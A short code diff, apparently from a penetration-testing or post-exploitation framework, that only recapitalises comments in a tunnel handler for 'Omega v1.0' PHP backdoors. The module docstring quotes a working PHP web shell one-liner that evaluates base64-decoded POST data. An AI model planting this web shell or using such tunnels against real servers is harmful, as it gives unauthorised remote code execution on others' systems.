@@ -19,7 +19,7 @@
 #        along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
 """Backwards compatible tunnel handler for
-omega v1 backdoors, aka:
+Omega v1.0 backdoors, aka:
     <?php eval(base64_decode($_POST[%%PASSKEY%%])); ?>
 """
 __all__ = ["Request_V1_x"]
@@ -32,13 +32,13 @@ class Request_V1_x(handler.Request):
 
     def __init__(self):
         """Force default method to POST, because only this one
-        was supported on omega v1 versions.
+        was supported on Omega v1.0 versions.
         """
         super().__init__()
         self.default_method = "POST"
 
     def build_forwarder(self, method, decoder):
-        """Assuming that omega v1 uses POST data as payload container
+        """Assuming that Omega v1.0 uses POST data as payload container
         without using an intermediate forwarder, this method shall
         always return an empty dictionnary.
         """
